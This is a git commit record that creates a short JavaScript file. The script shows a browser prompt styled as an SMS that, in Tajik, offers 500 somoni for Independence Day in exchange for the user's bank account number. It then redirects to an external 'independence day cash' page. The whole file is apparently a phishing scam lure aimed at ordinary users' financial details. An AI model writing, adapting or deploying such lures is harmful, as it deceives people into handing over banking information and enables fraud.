617a401193e1f8510820c1bd7454034529737922
ukodriller <fungus_cane_3o@icloud.com>
2026-09-05 18:56:04 -1200

    Create taj.js

---
+++ taj.js
@@ -0,0 +1,5 @@
+    var password = 'Tjs500'
+password=prompt('SMS: Салом, барои гирифтани пешниҳоди 500 сомонӣ ба муносибати Рӯзи истиқлолият, рақами ҳисоби худро ворид кунед., Барои гирифтани он ҳозир тугмаи OK-ро пахш кунед','Tjs500');
+if (password != 'Tjs500') {
+location.href='https://www.ukodriller.com/tjs500-independence-day-cash';
+}
